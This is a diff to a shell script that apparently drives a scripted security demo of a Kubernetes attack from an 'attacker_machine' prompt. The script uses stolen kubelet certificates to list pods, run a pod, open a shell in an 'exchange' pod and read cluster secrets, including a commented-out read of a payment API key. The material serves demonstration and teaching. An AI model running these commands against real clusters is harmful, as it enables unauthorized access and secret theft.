@@ -12,7 +12,7 @@ set -o pipefail
 DEMOMAGIC="demo-magic.sh"
 
 if [ ! -f $DEMOMAGIC ]; then
-  wget -q https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh 
+  curl -OsS -L https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh 
 fi
 
 DEMO_PROMPT="attacker_machine$ "
@@ -46,10 +46,16 @@ DEMO_PROMPT="attacker_machine$ "
 kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get pods --all-namespaces
 p "kubectl run newnx --image=nginx"
 kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 run newnx --image=nginx || true
+EXCHANGE=$(kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get pods -n exchange --selector=app=exchange --output=jsonpath={.items..metadata.name})
+p "kubectl exec -it ${EXCHANGE} -- /bin/bash"
+kubectl --client-certificate ../kubelet_keys/client.crt --client-key \
+../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt \
+--server https://35.185.243.113 -n exchange exec -it ${EXCHANGE} -- /bin/bash || true
 p "kubectl get secrets"
 kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get secrets
+#p "kubectl get payment-api-key"
+#kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get secret payment-api-key
+
 
 #p "kubectl auth can-i create certificatesigningrequests"
 #kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 auth can-i create certificatesigningrequests
-
-
